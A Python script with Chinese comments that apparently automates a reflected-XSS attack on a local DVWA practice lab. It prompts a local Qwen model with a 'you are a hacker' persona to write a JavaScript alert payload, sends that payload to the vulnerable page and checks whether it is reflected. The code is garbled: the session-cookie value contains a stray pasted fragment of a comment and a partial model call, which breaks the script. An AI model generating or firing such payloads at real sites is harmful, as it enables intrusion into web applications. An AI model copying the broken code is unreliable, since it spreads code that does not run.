import requests
import ollama

# 靶场地址（DVWA 的 XSS 反射型页面）
url = "http://127.0.0.1/vulnerabilities/xss_r/"

# ⚠️ 必须修改这里！
cookies = {
    "PHPSESSID": "# 把原来的 model='qwen2.5' 或者 qwen2.5:1.5b 统统删掉，换成：
response = ollama.chat(model='modelscope.cn/Qwen/Qwen2.5-1.5B-Instruct-GGUF', messages=[",  # 去浏览器F12里复制
    "security": "low"
}

print("【AI 正在疯狂思考恶意 Payload...】")

# 调用本地大模型生成 Payload
response = ollama.chat(model='modelscope.cn/Qwen/Qwen2.5-1.5B-Instruct-GGUF', messages=[
  {
    'role': 'user',
    'content': '你是一个黑客。请生成一个 JavaScript 的 XSS payload，用于弹出一个警告框，内容写“AI破了防”。只输出代码，不要任何解释。'
  }
])

# 清理大模型生成的文本
ai_payload = response['message']['content'].strip()
ai_payload = ai_payload.replace("```html", "").replace("```javascript", "").replace("```", "").strip()

print(f"【AI 生成的 Payload】: {ai_payload}")
print("【正在自动发送攻击...】")

# 发送攻击请求
r = requests.get(url, params={"name": ai_payload, "Submit": "Submit"}, cookies=cookies)

# 验证是否成功
if ai_payload in r.text or "AI破了防" in r.text:
    print(f"🚨 [致命打击] AI Fuzzing 成功！Payload 生效！")
else:
    print("[-] 失败。检查 PHPSESSID 是不是过期了，或者靶场没开。")
